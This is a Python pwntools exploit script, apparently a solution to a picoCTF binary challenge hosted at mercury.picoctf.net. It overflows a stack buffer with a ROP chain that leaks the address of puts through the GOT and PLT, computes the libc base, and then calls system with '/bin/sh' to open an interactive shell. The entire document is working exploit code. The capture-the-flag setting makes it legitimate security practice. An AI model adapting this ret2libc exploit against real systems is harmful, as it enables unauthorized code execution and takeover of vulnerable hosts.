from pwn import *

#context.arch = 'amd64'
#context.log_level = 'debug'

elf = ELF("./vuln")
libc = ELF('./libc.so.6')

p = remote('mercury.picoctf.net', 42072)

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
print(hex(puts_got))
print(hex(puts_plt))

mainadr = elf.sym['main']

poprdi = 0x400913
poprdx = 0x001b96
ret = 0x40052e

pad = 136

p.recvuntil(b'eR!\n')
payload = b'A'*pad + p64(poprdi) + p64(puts_got) + p64(puts_plt) + p64(mainadr)

p.sendline(payload)
p.recvline()

puts_leak = u64(p.recv(6)+b'\x00\x00')
print(hex(puts_leak))

libc_base = puts_leak - libc.sym['puts']
print(hex(libc_base))
sym = libc_base + libc.sym['system']
binsh = libc_base + next(libc.search(b'/bin/sh\x00'))
null = next(libc.search(b'\x00'*8))
execve = libc.symbols['execve']

payload = b'A'*pad  + p64(ret) + p64(poprdi) + p64(binsh) + p64(sym)

p.clean()
p.sendline(payload)

p.interactive()

